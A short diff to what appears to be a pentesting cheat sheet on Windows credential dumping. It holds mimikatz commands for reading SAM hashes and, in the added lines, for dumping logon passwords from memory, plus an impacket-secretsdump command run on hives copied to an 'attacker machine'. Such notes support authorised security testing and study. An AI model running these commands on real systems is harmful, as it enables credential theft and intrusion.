@@ -221,9 +221,13 @@ privilege::debug
 token::elevate
 lsadump::sam C:\SAM C:\SYSTEM
 
+mimikatz.exe
+sekurlsa::logonpasswords
+
 #or transfer SAM and SYSTEM to attacker machine 
 
 impacket-secretsdump -sam SAM -system SYSTEM local 
+
 
 
 ```
